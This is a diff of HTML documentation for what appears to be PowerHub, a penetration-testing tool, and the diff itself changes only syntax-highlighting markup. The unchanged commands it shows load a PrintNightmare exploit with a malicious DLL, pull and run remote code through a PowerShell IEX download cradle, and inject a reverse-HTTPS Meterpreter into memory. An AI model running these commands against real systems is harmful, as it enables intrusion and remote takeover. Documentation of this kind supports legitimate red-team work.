@@ -312,8 +312,8 @@ default). Be careful, it allows anonymous access.</p>
 Some exploits require a DLL, so the idea is that you mount the  WebDAV
 drive, put malicious DLLs in the read-only directory, and then load them
 like this:</p>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">cve</span><span class="p">-</span><span class="n">2021</span><span class="p">-</span><span class="n">1675</span><span class="p">.</span><span class="n">ps1</span>
-<span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Invoke-Nightmare</span> <span class="n">-DLL</span> <span class="s2">&quot;R:\evil-exploit-code.dll&quot;</span>
+<div class="highlight-ps1con notranslate"><div class="highlight"><pre><span></span><span class="gp">PS C:\&gt; </span><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">cve</span><span class="p">-</span><span class="n">2021</span><span class="p">-</span><span class="n">1675</span><span class="p">.</span><span class="n">ps1</span>
+<span class="gp">PS C:\&gt; </span><span class="nb">Invoke-Nightmare</span> <span class="n">-DLL</span> <span class="s2">&quot;R:\evil-exploit-code.dll&quot;</span>
 </pre></div>
 </div>
 <p>The other has two folders and is writable by everyone:</p>
@@ -396,8 +396,8 @@ LSASS creds with <a class="reference external" href="https://github.com/gentilki
 <section id="meterpreter">
 <h3>Meterpreter<a class="headerlink" href="#meterpreter" title="Permalink to this heading"></a></h3>
 <p>Let’s say you want to execute a Meterpreter in memory, then you do this after placing <code class="docutils literal notranslate"><span class="pre">meterpreter.exe</span></code> in <code class="docutils literal notranslate"><span class="pre">$XDG_DATA_HOME/powerhub/modules/exe</span></code> (don’t forget to reload the modules!):</p>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">pentestuser</span><span class="p">&gt;</span> <span class="nv">$K</span><span class="p">=</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">;</span><span class="nb">IEX </span><span class="nv">$K</span><span class="p">.</span><span class="n">downloadstring</span><span class="p">(</span><span class="s2">&quot;http://10.0.100.13:8000/0&quot;</span><span class="p">);</span>
-<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">pentestuser</span><span class="p">&gt;</span> <span class="n">ghm</span> <span class="n">ReflectivePEInjection</span><span class="p">;</span> <span class="n">ghm</span> <span class="n">meterpreter</span><span class="p">.</span><span class="n">exe</span><span class="p">|</span><span class="n">re</span>
+<div class="highlight-ps1con notranslate"><div class="highlight"><pre><span></span><span class="gp">PS C:\Users\pentestuser&gt; </span><span class="nv">$K</span><span class="p">=</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">;</span><span class="nb">IEX </span><span class="nv">$K</span><span class="p">.</span><span class="n">downloadstring</span><span class="p">(</span><span class="s2">&quot;http://10.0.100.13:8000/0&quot;</span><span class="p">);</span>
+<span class="gp">PS C:\Users\pentestuser&gt; </span><span class="n">ghm</span> <span class="n">ReflectivePEInjection</span><span class="p">;</span> <span class="n">ghm</span> <span class="n">meterpreter</span><span class="p">.</span><span class="n">exe</span><span class="p">|</span><span class="n">re</span>
 </pre></div>
 </div>
 <p>It should be a staged Meterpreter to keep the binary sufficiently small. I usually use <code class="docutils literal notranslate"><span class="pre">windows/x64/meterpreter/reverse_https</span></code>.</p>
